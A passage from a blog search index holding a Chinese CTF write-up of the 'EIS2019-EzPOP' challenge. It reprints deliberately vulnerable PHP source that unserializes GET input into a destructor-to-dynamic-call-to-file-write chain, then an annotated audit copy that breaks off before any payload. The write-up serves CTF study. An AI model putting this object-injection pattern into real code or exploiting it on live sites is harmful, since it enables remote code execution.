<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>EIS2019-EzPOP</title>
      <link href="/2025/05/07/EIS2019-EzPOP/"/>
      <url>/2025/05/07/EIS2019-EzPOP/</url>
      
        <content type="html"><![CDATA[<h1 id="EIS2019-EzPOP"><a href="#EIS2019-EzPOP" class="headerlink" title="EIS2019-EzPOP"></a>EIS2019-EzPOP</h1><p>参考博客：<a href="https://blog.csdn.net/Xxy605/article/details/120641208">https://blog.csdn.net/Xxy605/article/details/120641208</a></p><p>打开网页一片空白，发现简介里有源码。</p><p>翻到最下面有一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们只要get传一个src即可看到源码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><hr><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭所有错误报告，避免在页面上显示错误信息</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 类 A：用于处理缓存内容的管理和存储</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br> <br>    <span class="hljs-comment">// 存储缓存数据的对象</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br>    <span class="hljs-comment">// 缓存的键名</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">// 缓存的过期时间</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 构造函数，初始化类的属性</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> object $store 存储缓存数据的对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> string $key 缓存的键名，默认为 &#x27;flysystem&#x27;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> mixed $expire 缓存的过期时间，默认为 null</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 清理缓存内容，只保留指定的属性</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $contents 缓存内容数组</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array 清理后的缓存内容数组</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-comment">// 定义需要保留的属性数组，并将其键值反转，方便后续使用</span><br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>          <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br> <br>        <span class="hljs-comment">// 遍历缓存内容数组</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-comment">// 如果当前元素是数组</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-comment">// 只保留指定属性的键值对</span><br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取用于存储的缓存内容</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> string 经过清理和 JSON 编码后的缓存内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 清理缓存内容</span><br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br> <br>        <span class="hljs-comment">// 将清理后的内容和其他信息进行 JSON 编码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 保存缓存内容到存储对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 获取用于存储的缓存内容</span><br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br> <br>        <span class="hljs-comment">// 调用存储对象的 set 方法保存缓存内容</span><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 析构函数，在对象销毁时自动调用</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 如果 autosave 属性为 false</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-comment">// 保存缓存内容</span><br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 类 B：用于处理缓存的设置和文件存储</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取过期时间，将其转换为整数</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> mixed $expire 过期时间</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> int 转换后的过期时间</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取缓存的键名，添加前缀</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> string $name 原始键名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> string 添加前缀后的键名</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 序列化数据</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> mixed $data 要序列化的数据</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> string 序列化后的数据</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-comment">// 如果数据是数字类型</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-comment">// 将其转换为字符串</span><br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br> <br>        <span class="hljs-comment">// 获取序列化方法</span><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br> <br>        <span class="hljs-comment">// 调用序列化方法进行序列化</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 设置缓存</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> string $name 缓存的键名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> mixed $value 缓存的值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> mixed $expire 缓存的过期时间，默认为 null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> bool 设置是否成功</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-comment">// 记录写入次数</span><br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br> <br>        <span class="hljs-comment">// 如果过期时间为 null</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-comment">// 使用默认的过期时间</span><br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable 